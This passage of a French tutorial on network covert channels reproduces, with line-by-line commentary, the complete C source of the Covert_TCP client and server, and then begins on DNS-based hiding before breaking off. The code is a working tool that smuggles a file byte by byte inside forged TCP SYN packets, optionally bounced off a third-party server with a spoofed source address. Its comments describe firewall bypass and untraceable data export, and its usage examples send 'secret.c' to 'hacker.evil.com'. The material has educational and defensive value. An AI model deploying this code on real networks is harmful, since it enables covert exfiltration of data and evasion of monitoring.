      Le code source que je vais vous pr&eacute;senter utilise le champ S&eacute;quence 
      pour cacher ses donn&eacute;es et devrait normalement &ecirc;tre capable 
      d'utiliser un serveur de rebond puis de r&eacute;cup&eacute;rer les donn&eacute;es 
      dans le champ Num&eacute;ro d'ACK.<br>
      Une petite explication s'impose, comme vous l'avez vu plus haut le champ 
      Num&eacute;ro d'ACK = le champ S&eacute;quence +1. Le champ Num&eacute;ro 
      d'ACK est utilis&eacute; seulement apr&egrave;s une demande de connection 
      (flag SYN), le fonctionnement du programme consiste &agrave; envoyer un 
      SYN vers un serveur de rebond en falsifiant l'adresse source pour que le 
      serveur de rebond renvoit le paquet vers le serveur de notre cr&eacute;ation 
      qui va s'occuper d'extraire les donn&eacute;es dans le champ Num&eacute;ro 
      d'ACK.<br> <br>
      Voyons cela dans la pratique :<br>
      Ces codes sont tir&eacute;s d'un article tr&egrave;s int&eacute;ressant 
      sur les covert channel TCP et IP: [<a href="#ROWLANDCOVER">ROWLANDCOVER</a>]. 
      Je n'ai fait que s&eacute;parer le c&ocirc;ter client/serveur et le covert 
      channel TCP et IP.<br> <pre><code>client.h:<br>     1	#include &lt;stdio.h&gt;<br>     2	#include &lt;stdlib.h&gt;<br>     3	#include &lt;signal.h&gt;<br>     4	#include &lt;string.h&gt;<br>     5	#include &lt;unistd.h&gt;<br>     6	#include &lt;netdb.h&gt;<br>     7	#include &lt;netinet/in.h&gt;<br>     8	#include &lt;sys/socket.h&gt;<br>     9	#include &lt;arpa/inet.h&gt;<br>    10	#include &lt;linux/ip.h&gt;<br>    11	#include &lt;linux/tcp.h&gt;<br>       <br>    12	void forgepacket(unsigned int, unsigned int, unsigned short, unsigned short, char *,<br>    13						  int);<br>    14						  <br>    15	unsigned int host_convert(char *);<br>    16	unsigned short in_cksum(unsigned short *, int);<br>    17	void usage(char *);<br><br>client.c:<br>     1	/* Covert_TCP 1.0 - Covert channel file transfer for Linux<br>     2	* Written by Craig H. Rowland (crowland@psionic.com)<br>     3	* Copyright 1996 Craig H. Rowland (11-15-96)<br>     4	* NOT FOR COMMERCIAL USE WITHOUT PERMISSION. <br>     5	* <br>     6	*<br>     7	* This program manipulates the TCP/IP header to transfer a file one byte<br>     8	* at a time to a destination host. This progam can act as a server and a client<br>     9	* and can be used to conceal transmission of data inside the IP header. <br>    10	* This is useful for bypassing firewalls from the inside, and for <br>    11	* exporting data with innocuous looking packets that contain no data for <br>    12	* sniffers to analyze. In other words, spy stuff... :)<br>    13	*<br>    14	* PLEASE see the enclosed paper for more information!!<br>    15	*<br>    16	* This software should be used at your own risk. <br>    17	*<br>    18	* compile: cc -o covert_tcp covert_tcp.c<br>    19	*<br>    20	* <br>    21	* Portions of this code based on ping.c (c) 1987 Regents of the <br>    22	* University of California. (See function in_cksm() for details)<br>    23	*<br>    24	* Small portions from various packet utilities by unknown authors<br>    25	*/<br>       <br>    26	#include "client.h"<br>       <br>    27	int main(int argc, char *argv[]) {<br>       <br>    28	   unsigned int source_host=0,dest_host=0;<br>    29	   unsigned short source_port=0,dest_port=80;<br>    30	   int seq=0,file=0;<br>    31	   int count;<br>    32	   char desthost[80],srchost[80],filename[80];<br>       <br>    33	   if(geteuid() !=0)<br>    34	    {<br>    35	    printf("\nYou need to be root to run this because it use sock_raw.\n\n");<br>    36	    exit(0);<br>    37	    }<br>    38	    <br>    39	   if(argc != 11)<br>    40	   {<br>    41	   usage(argv[0]);<br>    42	   exit(0);<br>    43	   }    <br>    44	   for(count=0; count &lt; argc; ++count)<br>    45	    {<br>    46	    if (strcmp(argv[count],"-dest") == 0)<br>    47	     {<br>    48	     dest_host=host_convert(argv[count+1]); <br>    49	     strncpy(desthost,argv[count+1],79);<br>    50	     }<br>    51	     <br>    52	    else if (strcmp(argv[count],"-source") == 0)<br>    53	     {<br>    54	     source_host=host_convert(argv[count+1]); <br>    55	     strncpy(srchost,argv[count+1],79);<br>    56	     }<br>       <br>    57	    else if (strcmp(argv[count],"-file") == 0)<br>    58	     {<br>    59	     strncpy(filename,argv[count+1],79);<br>    60	     file=1;<br>    61	     }<br>       <br>    62	    else if (strcmp(argv[count],"-source_port") == 0)<br>    63	      source_port=atoi(argv[count+1]);<br>       <br>    64	    else if (strcmp(argv[count],"-dest_port") == 0)<br>    65	      dest_port=atoi(argv[count+1]);<br>    66	    }<br><br>    67	    seq=1; <br>       <br>    68	   if(file != 1)<br>    69	    {<br>    70	    printf("\n\nYou need to supply a filename (-file &lt;filename&gt;)\n\n");<br>    71	    exit(1);<br>    72	    }<br>       <br>    73	     if (source_host == 0 &amp;&amp; dest_host == 0)<br>    74	      {<br>    75	      printf("\n\nYou need to supply a source and destination address for client mode.\n\n");<br>    76	      exit(1);<br>    77	      }<br>       <br>    78	     else<br>    79	      {<br>    80	      printf("Destination Host: %s\n",desthost);<br>    81	      printf("Source Host     : %s\n",srchost);<br>       <br>    82	       if(source_port == 0)<br>    83	        printf("Originating Port: random\n");<br>       <br>    84	       else<br>    85	        printf("Originating Port: %u\n",source_port);<br>       <br>    86	      printf("Destination Port: %u\n",dest_port);<br>    87	      printf("Encoded Filename: %s\n",filename);<br>       <br>    88	      printf("Encoding Type   : IP Sequence Number\n");<br>       <br>    89	      printf("\nClient Mode: Sending data.\n\n");<br>    90	     }<br>    91	     <br>    92	     forgepacket(source_host, dest_host, source_port, dest_port,filename,seq);<br>    93	     exit(0);<br>    94	}<br>       <br>    95	void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned \<br>    96	short source_port, unsigned short dest_port, char *filename, int seq) {<br>    97	   struct send_tcp<br>    98	   {<br>    99	      struct iphdr ip;<br>   100	      struct tcphdr tcp;<br>   101	   } send_tcp;<br>       <br>   102	   struct pseudo_header<br>   103	   {<br>   104	      unsigned int source_address;<br>   105	      unsigned int dest_address;<br>   106	      unsigned char placeholder;<br>   107	      unsigned char protocol;<br>   108	      unsigned short tcp_length;<br>   109	      struct tcphdr tcp;<br>   110	   } pseudo_header;<br>       <br>   111	   int ch;<br>   112	   int send_socket;<br>   113	   struct sockaddr_in sin;<br>   114	   FILE *input;<br>   115	   <br>   116		srand((getpid())*(dest_port)); <br>   117		<br>   118		if((input=fopen(filename,"rb"))== NULL)<br>   119	 {<br>   120	 printf("I cannot open the file %s for reading\n",filename);<br>   121	 exit(1);<br>   122	 }<br>       <br>   123	else while((ch=fgetc(input)) !=EOF)<br>   124	 {<br>       <br>   125		sleep(1);<br>       <br>   126	   send_tcp.ip.ihl = 5;<br>   127	   send_tcp.ip.version = 4;<br>   128	   send_tcp.ip.tos = 0;<br>   129	   send_tcp.ip.tot_len = htons(40);<br>   130	   send_tcp.ip.id =(int)(255.0*rand()/(RAND_MAX+1.0)); <br>   131	   send_tcp.ip.frag_off = 0;<br>   132	   send_tcp.ip.ttl = 64; <br>   133	   send_tcp.ip.protocol = IPPROTO_TCP;<br>   134	   send_tcp.ip.check = 0;<br>   135	   send_tcp.ip.saddr = source_addr;<br>   136	   send_tcp.ip.daddr = dest_addr;<br>       <br>   137	if(source_port == 0) <br>   138	   send_tcp.tcp.source = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));<br>       <br>   139	else <br>   140	   send_tcp.tcp.source = htons(source_port);<br>       <br>   141	   send_tcp.tcp.seq = ch;<br>       <br>   142	   send_tcp.tcp.dest = htons(dest_port);<br>       <br>   143	   send_tcp.tcp.ack_seq = 0;<br>   144	   send_tcp.tcp.res1 = 0;<br>   145	   send_tcp.tcp.doff = 5;<br>   146	   send_tcp.tcp.fin = 0;<br>   147	   send_tcp.tcp.syn = 1;<br>   148	   send_tcp.tcp.rst = 0;<br>   149	   send_tcp.tcp.psh = 0;<br>   150	   send_tcp.tcp.ack = 0;<br>   151	   send_tcp.tcp.urg = 0;<br>   152	   send_tcp.tcp.ece = 0;<br>   153	   send_tcp.tcp.window = htons(512);<br>   154	   send_tcp.tcp.check = 0;<br>   155	   send_tcp.tcp.urg_ptr = 0;<br>       <br>   156	   sin.sin_family = AF_INET;<br>   157	   sin.sin_port = send_tcp.tcp.source;<br>   158	   sin.sin_addr.s_addr = send_tcp.ip.daddr;   <br>       <br>   159	   send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<br>   160	   if(send_socket &lt; 0)<br>   161	   {<br>   162	      perror("send socket cannot be open. Are you root?");<br>   163	      exit(1);<br>   164	   }<br>       <br>   165	      send_tcp.ip.check = in_cksum((unsigned short *)&amp;send_tcp.ip, 20);<br>   166	      <br>   167	      pseudo_header.source_address = send_tcp.ip.saddr;<br>   168	      pseudo_header.dest_address = send_tcp.ip.daddr;<br>   169	      pseudo_header.placeholder = 0;<br>   170	      pseudo_header.protocol = IPPROTO_TCP;<br>   171	      pseudo_header.tcp_length = htons(20);<br>       <br>   172	      bcopy((char *)&amp;send_tcp.tcp, (char *)&amp;pseudo_header.tcp, 20);<br>       <br>   173	      send_tcp.tcp.check = in_cksum((unsigned short *)&amp;pseudo_header, 32);<br>       <br>   174	      sendto(send_socket, &amp;send_tcp, 40, 0, (struct sockaddr *)&amp;sin, sizeof(sin));<br>   175	      printf("Sending Data: %c\n",ch);<br>       <br>   176	  close(send_socket);<br>   177	 } <br>       <br>   178	fclose(input);<br>   179	} <br>       <br>       <br>   180	unsigned int host_convert(char *hostname){<br>   181	   static struct in_addr i;<br>   182	   struct hostent *h;<br>   183	   i.s_addr = inet_addr(hostname);<br>   184	   if(i.s_addr == -1)<br>   185	   {<br>   186	      h = gethostbyname(hostname);<br>   187	      if(h == NULL)<br>   188	      {<br>   189	         fprintf(stderr, "cannot resolve %s\n", hostname);<br>   190	         exit(0);<br>   191	      }<br>   192	      bcopy(h-&gt;h_addr, (char *)&amp;i.s_addr, h-&gt;h_length);<br>   193	   }<br>   194	   return i.s_addr;<br>   195	}<br>       <br>   196	unsigned short in_cksum(unsigned short *ptr, int nbytes){<br>   197	        register long           sum;            /* assumes long == 32 bits <br>   198	*/<br>   199	        u_short                 oddbyte;<br>   200	        register u_short        answer;         /* assumes u_short == 16 bits */<br>       <br>   201	        /*<br>   202	         * Our algorithm is simple, using a 32-bit accumulator (sum),<br>   203	         * we add sequential 16-bit words to it, and at the end, fold back<br>   204	         * all the carry bits from the top 16 bits into the lower 16 bits.<br>   205	         */<br>       <br>   206	        sum = 0;<br>   207	        while (nbytes &gt; 1)  {<br>   208	                sum += *ptr++;<br>   209	                nbytes -= 2;<br>   210	        }<br>       <br>   211	                                /* mop up an odd byte, if necessary */<br>   212	        if (nbytes == 1) {<br>   213	                oddbyte = 0;            /* make sure top half is zero */<br>   214	                *((u_char *) &amp;oddbyte) = *(u_char *)ptr;   /* one byte only */<br>   215	                sum += oddbyte;<br>   216	        }<br>       <br>   217	        /*<br>   218	         * Add back carry outs from top 16 bits to low 16 bits.<br>   219	         */<br>       <br>   220	        sum  = (sum &gt;&gt; 16) + (sum &amp; 0xffff);    /* add high-16 to low-16 */<br>   221	        sum += (sum &gt;&gt; 16);                     /* add carry */<br>   222	        answer = ~sum;          /* ones-complement, then truncate to 16 bits <br>   223	*/<br>   224	        return(answer);<br>   225	}<br>       <br>       <br>   226	void usage(char *progname){<br>       <br>   227	      printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file \<br>   228	filename -source_port port -dest_port port\n\n", <br>   229	progname);<br>   230	      printf("-dest dest_ip      - Host to send data to.\n");<br>   231	      printf("-source source_ip  - Host where you want the data to originate \<br>   232	from.\n");<br>   233	      printf("-source_port port  - IP source port you want data to appear from. \n");<br>   234	      printf("                     (randomly set by default)\n");<br>   235	      printf("-dest_port port    - IP source port you want data to go to. In\n");<br>   236	      printf("                     SERVER mode this is the port data will be coming\n");<br>   237	      printf("                     inbound on. Port 80 by default.\n");<br>   238	      printf("-file filename     - Name of the file to encode and transfer.\n");<br>   239	      printf("\nPress ENTER for examples.");<br>   240	      getchar();<br>   241	      printf("\nExample: \nclient -dest foo.bar.com -source hacker.evil.com - \<br>   242	source_port 1234 -dest_port 80 -file secret.c\n\n");<br>   243	      printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");<br>   244	      printf("at a time using the default IP packet ID encoding.\n");<br>   245	      exit(0);<br>   246	}<br></code></pre>
      client.h: on retrouve les headers n&eacute;cessaires au programme et le 
      prototype des fonctions de notre cr&eacute;ation.<br>
      Dans client.c:<br>
      lignes 28 &agrave; 91: on filtre les options pass&eacute;es au programme 
      et on les stocks.<br>
      ligne 92: on appel la fonction forgepacket() qui s'occupe de presque tout.<br>
      lignes 97 &agrave; 110: on cr&eacute;&eacute; une structure contenant les 
      header IP et TCP et on cr&eacute;&eacute; le pseudo header TCP.<br>
      ligne 116: on initialise le g&eacute;n&eacute;rateur de nombres pseudo-al&eacute;atoire.<br>
      lignes 118 &agrave; 122: on essaye d'ouvrir le fichier qui contient les 
      donn&eacute;es envoy&eacute;es.<br>
      ligne 123 &agrave; 179: on cr&eacute;&eacute; une boucle qui s'occupe de 
      remplir l'header et de l'envoyer pour chaque caract&egrave;re pr&eacute;sent 
      dans le fichier texte.<br>
      ligne 125: on retrouve le sleep(1) qui s'occupe d'espacer le temps d'envoie 
      pour &eacute;viter les pertes de donn&eacute;es.<br>
      ligne 141: on voit bien la copie du caract&egrave;re (de son code ASCII 
      exacement) dans le champ N&deg; de S&eacute;quence.<br>
      lignes 178 et 179: on ferme le fichier et la fonction principale.<br>
      lignes 180 &agrave; 195: la fonction host_convert() sert &agrave; r&eacute;soudre 
      les ip pass&eacute;es au programme.<br>
      lignes 196 &agrave; 225: la fonction servant &agrave; calculer le checksum 
      (il s'agit d'une fonction passe-partout pour calculer les checksum des paquets 
      UDP et TCP).<br>
      lignes 226 &agrave; 246: cette fonction sert &agrave; afficher l'aide.<br> 
      <br>
      Du c&ocirc;ter du serveur:<br> <pre><code>server.h:<br>     1	#include &lt;stdio.h&gt;<br>     2	#include &lt;stdlib.h&gt;<br>     3	#include &lt;signal.h&gt;<br>     4	#include &lt;string.h&gt;<br>     5	#include &lt;unistd.h&gt;<br>     6	#include &lt;netdb.h&gt;<br>     7	#include &lt;netinet/in.h&gt;<br>     8	#include &lt;sys/socket.h&gt;<br>     9	#include &lt;arpa/inet.h&gt;<br>    10	#include &lt;linux/ip.h&gt;<br>    11	#include &lt;linux/tcp.h&gt;<br>       <br>    12	void forgepacket(unsigned int, unsigned int, unsigned short, unsigned short, char *,<br>    13						  int, int);<br>    14						  <br>    15	unsigned int host_convert(char *);<br>    16	unsigned short in_cksum(unsigned short *, int);<br>    17	void usage(char *);<br><br>server.c:<br>     1	/* Covert_TCP 1.0 - Covert channel file transfer for Linux<br>     2	* Written by Craig H. Rowland (crowland@psionic.com)<br>     3	* Copyright 1996 Craig H. Rowland (11-15-96)<br>     4	* NOT FOR COMMERCIAL USE WITHOUT PERMISSION. <br>     5	* <br>     6	*<br>     7	* This program manipulates the TCP/IP header to transfer a file one byte<br>     8	* at a time to a destination host. This progam can act as a server and a client<br>     9	* and can be used to conceal transmission of data inside the IP header. <br>    10	* This is useful for bypassing firewalls from the inside, and for <br>    11	* exporting data with innocuous looking packets that contain no data for <br>    12	* sniffers to analyze. In other words, spy stuff... :)<br>    13	*<br>    14	* PLEASE see the enclosed paper for more information!!<br>    15	*<br>    16	* This software should be used at your own risk. <br>    17	*<br>    18	* compile: cc -o covert_tcp covert_tcp.c<br>    19	*<br>    20	* <br>    21	* Portions of this code based on ping.c (c) 1987 Regents of the <br>    22	* University of California. (See function in_cksm() for details)<br>    23	*<br>    24	* Small portions from various packet utilities by unknown authors<br>    25	*/<br>       <br>    26	#include "server.h"<br>       <br>    27	int main(int argc, char *argv[]){<br>       <br>    28	   unsigned int source_host=0,dest_host=0;<br>    29	   unsigned short source_port=0,dest_port=80;<br>    30	   int seq=0,ack=0,file=0;<br>    31	   int count;<br>    32	   char desthost[80],srchost[80],filename[80];<br>       <br>    33	   if(geteuid() !=0)<br>    34	    {<br>    35	    printf("\nYou need to be root to run this.\n\n");<br>    36	    exit(0);<br>    37	    }<br>       <br>    38	   if((argc &lt; 6) || (argc &gt; 13))<br>    39	   {<br>    40	   usage(argv[0]);<br>    41	   exit(0);<br>    42	   }<br>       <br>       <br>    43	   for(count=0; count &lt; argc; ++count)<br>    44	    {<br>    45	    if (strcmp(argv[count],"-dest") == 0)<br>    46	     {<br>    47	     dest_host=host_convert(argv[count+1]); <br>    48	     strncpy(desthost,argv[count+1],79);<br>    49	     }<br>    50	     <br>    51	    else if (strcmp(argv[count],"-source") == 0)<br>    52	     {<br>    53	     source_host=host_convert(argv[count+1]); <br>    54	     strncpy(srchost,argv[count+1],79);<br>    55	     }<br>       <br>    56	    else if (strcmp(argv[count],"-file") == 0)<br>    57	     {<br>    58	     strncpy(filename,argv[count+1],79);<br>    59	     file=1;<br>    60	     }<br>       <br>    61	    else if (strcmp(argv[count],"-source_port") == 0)<br>    62	      source_port=atoi(argv[count+1]);<br>       <br>    63	    else if (strcmp(argv[count],"-dest_port") == 0)<br>    64	      dest_port=atoi(argv[count+1]);<br>       <br>    65	    else if (strcmp(argv[count],"-seq") == 0)<br>    66	      seq=1;<br>       <br>    67	    else if (strcmp(argv[count],"-ack") == 0)<br>    68	      ack=1;<br>       <br>    69	    }<br>    70	    <br>    71	   if(seq+ack == 0)<br>    72	    seq=1; <br>    73	    <br>    74	   else if (seq+ack !=1)<br>    75	    {<br>    76	    printf("\n\nOnly one encoding/decode flag (-seq -ack) can be used at a time.\n\n");<br>    77	    exit(1);<br>    78	    }<br>       <br>    79	   if(file != 1)<br>    80	    {<br>    81	    printf("\n\nYou need to supply a filename (-file &lt;filename&gt;)\n\n");<br>    82	    exit(1);<br>    83	    }<br>    84	    <br>    85	    if (source_host == 0 &amp;&amp; source_port == 0)<br>    86	      {<br>    87	      printf("You need to supply a source address and/or source port for server mode.\n");<br>    88	      exit(1);<br>    89	      }<br>       <br>    90	     if(dest_host == 0)<br>    91	      strcpy(desthost,"Any Host");<br>       <br>    92	     if(source_host == 0)<br>    93	      strcpy(srchost,"Any Host");<br>       <br>    94	     printf("Listening for data from IP: %s\n",srchost);<br>    95	     <br>    96	     if(source_port == 0)<br>    97	      printf("Listening for data bound for local port: Any Port\n");<br>       <br>    98	     else<br>    99	      printf("Listening for data bound for local port: %u\n",source_port);<br>       <br>   100	     printf("Decoded Filename: %s\n",filename);<br>       <br>   101	     if(seq == 1)<br>   102	      printf("Decoding Type Is: IP Sequence Number\n");<br>       <br>   103	     else if(ack == 1)<br>   104	      printf("Decoding Type Is: IP ACK field bounced packet.\n");<br>       <br>   105	     printf("\nServer Mode: Listening for data.\n\n");<br>       <br>   106	     forgepacket(source_host, dest_host, source_port, dest_port,filename,seq,ack);<br>   107		  exit(0);<br>   108	}<br>       <br>   109	void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned \<br>   110	short source_port, unsigned short dest_port, char *filename, int seq, int ack) {<br>       <br>   111	   struct recv_tcp<br>   112	   {<br>   113	      struct iphdr ip;<br>   114	      struct tcphdr tcp;<br>   115	      char buffer[10000];<br>   116	   } recv_pkt;<br>       <br>   117	   int recv_socket;<br>   118	   FILE *output;<br>   119	   <br>   120	   srand((getpid())*(dest_port)); <br>   121	   <br>   122	    if((output=fopen(filename,"wb"))== NULL)<br>   123	  {<br>   124	  printf("I cannot open the file %s for writing\n",filename);<br>   125	  exit(1);<br>   126	  }<br>       <br>   127	 while(1) <br>   128	 {<br>       <br>   129	   recv_socket = socket(AF_INET, SOCK_RAW, 6);<br>   130	   <br>   131	   if(recv_socket &lt; 0)<br>   132	   {<br>   133	      perror("receive socket cannot be open. Are you root?");<br>   134	      exit(1);<br>   135	   }<br>       <br>   136	  read(recv_socket, (struct recv_tcp *)&amp;recv_pkt, 9999);<br>   137	        if (source_port == 0) <br>   138	        {       <br>   139	                if((recv_pkt.tcp.syn == 1) &amp;&amp; (recv_pkt.ip.saddr == source_addr)) <br>   140	                {<br>   141									if (seq==1)<br>   142	                        {<br>   143	                        	printf("Receiving Data: %c\n",recv_pkt.tcp.seq);<br>   144	                        	fprintf(output,"%c",recv_pkt.tcp.seq); <br>   145	                        	fflush(output);<br>   146	                        }<br>       <br>   147	        /* Use a bounced packet from a remote server to decode the data */<br>   148	        /* This technique requires that the client initiates a SEND to */<br>   149	        /* a remote host with a SPOOFED source IP that is the location */<br>   150	        /* of the listening server. The remote server will receive the packet */<br>   151	        /* and will initiate an ACK of the packet with the encoded sequence */<br>   152	        /* number+1 back to the SPOOFED source. The covert server is waiting at this */<br>   153	        /* spoofed address and can decode the ack field to retrieve the data */<br>   154	        /* this enables an "anonymous" packet transfer that can bounce */<br>   155	        /* off any site. This is VERY hard to trace back to the originating */<br>   156	        /* source. This is pretty nasty as far as covert channels go... */<br>   157	        /* Some routers may not allow you to spoof an address outbound */<br>   158	        /* that is not on their network, so it may not work at all sites... */<br>   159	        /* SENDER should use covert_tcp with the -seq flag and a forged -source */<br>   160	        /* address. RECEIVER should use the -server -ack flags with the IP of */<br>   161	        /* of the server the bounced message will appear from.. CHR */<br>       <br>   162	        /* The bounced ACK sequence number is really the original sequence*/<br>   163	        /* plus one (ISN+1). However, the translation here drops some of the */<br>   164	        /* bits so we get the original ASCII value...go figure.. */<br>       <br>   165	                        else if (ack==1)<br>   166	                        {<br>   167	                         printf("Receiving Data: %c\n",recv_pkt.tcp.ack_seq);<br>   168	                         fprintf(output,"%c",recv_pkt.tcp.ack_seq); <br>   169	                         fflush(output);<br>   170	                        }<br>   171	                } <br>   172	        } <br>       <br>   173	        else<br>   174	        {<br>   175	                if((recv_pkt.tcp.syn==1) &amp;&amp; (ntohs(recv_pkt.tcp.dest) == source_port)) <br>   176	                {<br>   177									if (seq==1)<br>   178	                        {<br>   179	                        printf("Receiving Data: %c\n",recv_pkt.tcp.seq);<br>   180	                        fprintf(output,"%c",recv_pkt.tcp.seq); <br>   181	                        fflush(output);<br>   182	                        }<br>   183	                      <br>   184	                        else if (ack==1)<br>   185	                        {<br>   186	                        printf("Receiving Data: %c\n",recv_pkt.tcp.ack_seq);<br>   187	                        fprintf(output,"%c",recv_pkt.tcp.ack_seq); <br>   188	                        fflush(output);<br>   189	                        }<br>   190	                } <br>   191	        } <br>       <br>   192	   close(recv_socket); <br>   193	  }<br>       <br>   194	  fclose(output);<br>   195	}<br>       <br>   196	unsigned short in_cksum(unsigned short *ptr, int nbytes)<br>   197	{<br>   198	        register long           sum;            /* assumes long == 32 bits <br>   199	*/<br>   200	        u_short                 oddbyte;<br>   201	        register u_short        answer;         /* assumes u_short == 16 bits */<br>       <br>   202	        /*<br>   203	         * Our algorithm is simple, using a 32-bit accumulator (sum),<br>   204	         * we add sequential 16-bit words to it, and at the end, fold back<br>   205	         * all the carry bits from the top 16 bits into the lower 16 bits.<br>   206	         */<br>       <br>   207	        sum = 0;<br>   208	        while (nbytes &gt; 1)  {<br>   209	                sum += *ptr++;<br>   210	                nbytes -= 2;<br>   211	        }<br>       <br>   212	                                /* mop up an odd byte, if necessary */<br>   213	        if (nbytes == 1) {<br>   214	                oddbyte = 0;            /* make sure top half is zero */<br>   215	                *((u_char *) &amp;oddbyte) = *(u_char *)ptr;   /* one byte only */<br>   216	                sum += oddbyte;<br>   217	        }<br>       <br>   218	        /*<br>   219	         * Add back carry outs from top 16 bits to low 16 bits.<br>   220	         */<br>       <br>   221	        sum  = (sum &gt;&gt; 16) + (sum &amp; 0xffff);    /* add high-16 to low-16 */<br>   222	        sum += (sum &gt;&gt; 16);                     /* add carry */<br>   223	        answer = ~sum;          /* ones-complement, then truncate to 16 bits <br>   224	*/<br>   225	        return(answer);<br>   226	}<br>       <br>       <br>   227	unsigned int host_convert(char *hostname)<br>   228	{<br>   229	   static struct in_addr i;<br>   230	   struct hostent *h;<br>   231	   i.s_addr = inet_addr(hostname);<br>   232	   if(i.s_addr == -1)<br>   233	   {<br>   234	      h = gethostbyname(hostname);<br>   235	      if(h == NULL)<br>   236	      {<br>   237	         fprintf(stderr, "cannot resolve %s\n", hostname);<br>   238	         exit(0);<br>   239	      }<br>   240	      bcopy(h-&gt;h_addr, (char *)&amp;i.s_addr, h-&gt;h_length);<br>   241	   }<br>   242	   return i.s_addr;<br>   243	} <br>       <br>       <br>   244	void usage(char *progname)<br>   245	{<br>   246	      printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file \<br>   247	filename -source_port port -dest_port port [encode type]\n\n", <br>   248	progname);<br>   249	      printf("-dest dest_ip      - Host to send data to.\n");<br>   250	      printf("-source source_ip  - Host data will be coming FROM.\n");<br>   251	      printf("-source_port port  - IP source port you want data to appear from. \n");<br>   252	      printf("                     (randomly set by default)\n");<br>   253	      printf("-dest_port port    - IP source port you want data to go to. In\n");<br>   254	      printf("                     SERVER mode this is the port data will be coming\n");<br>   255	      printf("                     inbound on. Port 80 by default.\n");<br>   256	      printf("-file filename     - Name of the file to encode and transfer.\n");<br>   257	      printf("[Encode Type] - Optional encoding type\n");<br>   258	      printf("-seq  - Encode data a byte at a time in the packet sequence \<br>   259	number.\n");<br>   260	      printf("-ack  - DECODE data a byte at a time from the ACK field.\n");<br>   261	      printf("        This ONLY works from server mode and is made to decode\n");<br>   262	      printf("        covert channel packets that have been bounced off a remote\n");<br>   263	      printf("        server using -seq. See documentation for details\n");<br>   264	      printf("\nPress ENTER for examples.");<br>   265	      getchar();<br>   266	      printf("\nExample: \nserver -dest foo.bar.com -source hacker.evil.com - \<br>   267	dest_port 80 -file secret.c\n\n");<br>   268	      printf("Above listens passively for packets from  hacker.evil.com\n");<br>   269	      printf("destined for port 80. It takes the data and saves the file locally\n");<br>   270	      printf("as secret.c\n\n");<br>   271	      exit(0);<br>   272	} <br></code></pre>
      Dans server.c:<br>
      lignes 28 &agrave; 105: on filtre les donn&eacute;es pass&eacute;es au programme.<br>
      lignes 111 &agrave; 116: on cr&eacute;&eacute; une structure contenant les 
      header IP et TCP et le corps.<br>
      lignes 127 &agrave; 136: on mets en &eacute;coute le serveur. Ici le code 
      est particuli&egrave;rement sale &eacute;tant donn&eacute; qu'il n'y a aucune 
      v&eacute;rification avant le read(). Mais si vous voulez l'am&eacute;liorer 
      libre &agrave; vous :).<br>
      [Note Pour les Newbies: on passe en argument &agrave; read() l'adresse de 
      la structure contenant les formats des header, cette technique s'appelle 
      un cast].<br>
      lignes 137 &agrave; 146: on r&eacute;cup&egrave;re les donn&eacute;es dans 
      le champ N&deg; de S&eacute;quence et on les &eacute;cris dans un fichier.<br>
      lignes 147 &agrave; 164: un commentaire explicant le fonctionnement de la 
      technique utilisant le N&deg; de ACK, l'auteur du code explique que comme 
      certains bits sont perdus pendant la translation integer vers char malgr&eacute; 
      que le N&deg; de ACK soit diff&eacute;rent du N&deg; de S&eacute;quence, 
      la valeur au finale reste la m&ecirc;me.<br>
      lignes 165 &agrave; 170: on r&eacute;cup&egrave;re les donn&eacute;es dans 
      ce fameux champ N&deg; de ACK.<br>
      lignes 173 &agrave; 191: on recommence (m&ecirc;me chose que lignes 137 
      &agrave; 164) sauf que ce coup-ci le port source est d&eacute;fini par l'utilisateur 
      et on le compare par rapport au port source contenu dans l'header TCP ligne 
      175.<br>
      Pour la suite il s'agit des m&ecirc;mes fonctions que pour le client qui 
      font strictement la m&ecirc;me chose.<br> <br>
      Bon comme ce code n'est pas de moi je vais &eacute;viter de trop cracher 
      dessus :) mais comme vous le voyez l'auteur dit bien qu'il s'agit d'un proof 
      of concept et qu'il peut &ecirc;tre facilement am&eacute;liorer. D&eacute;j&agrave; 
      on pourrait mettre un syst&egrave;me de gestion des erreurs, utiliser le 
      multi-threads...<br> <br>
      [<a name="RFCTCP"></a>RFC]<br> <a href="http://abcdrfc.free.fr/rfc-vf/rfc793.html">http://abcdrfc.free.fr/rfc-vf/rfc793.html</a><br> 
      <br>
      [<a name="FrameIp"></a>FrameIp]<br> <a href="http://www.frameip.com/entetetcp/">http://www.frameip.com/entetetcp/</a><br> 
      <br>
      [<a name="ROWLANDCOVER"></a>ROWLANDCOVER]<br> <a href="http://ouah.kernsh.org/rowlandcover.htm">http://ouah.kernsh.org/rowlandcover.htm</a><br> 
      <p class="texttitre">Exemple: Protocole UDP</p>
      Comme d'habitude si vous voulez plus d'informations sur le protocole UDP 
      allez voir la [<a href="#RFCUDP">RFC</a>] ou sur [<a href="#FrameIpUDP">FrameIp</a>].<br>
      Le header UDP ressemble &agrave; &ccedil;a :<br> <img style="width: 611px; height: 284px;"
 alt="http://www.frameip.com/enteteudp/" src="covert_channel/img/udp.gif"><br>
      On voit tr&egrave;s vite que cet header ne pr&eacute;sente que peu d'int&eacute;r&ecirc;t 
      pour nous, tous les champs sont utiliser lors des communication il est donc 
      impossible d'y inclure des donn&eacute;es.<br>
      Les paquets UDP tout comme TCP utilisent un pseudo header pour se prot&eacute;ger 
      des erreurs de routage:<br> <img style="width: 611px; height: 284px;"
 alt="http://www.frameip.com/enteteudp/" src="covert_channel/img/udpfake.gif"><br>
      Et l&agrave; aussi on ne peut pas en tir&eacute; grand chose...<br>
      Mais qu'&agrave; cela ne tienne il existe encore une partie des paquets 
      UDP non utiliser, le corps.<br>
      Bien s&ucirc;r il ne faut pas balancer ses donn&eacute;es comme &ccedil;a 
      dans le corps, ce serait bien trop visible.<br>
      La technique la plus utilis&eacute;e par les hackers est g&eacute;n&eacute;ralement 
      de planquer les donn&eacute;es dans les requ&ecirc;tes DNS.<br>
      Ce protocole est extr&ecirc;mement utiliser et je vous propose d'aller voir 
      la [<a href="#RFCDNS">RFC</a>] DNS pour mieux conna&icirc;tre ce protocole.<br> 
      <br>
      Il existe dans le header des paquets DNS un champ appeler name qui ressemble 
      &agrave; 217.224.247.80.in-addr.arpa.<br>
      Les 4 premiers nombres sont une adresse ip, suivie g&eacute;n&eacute;ralement 
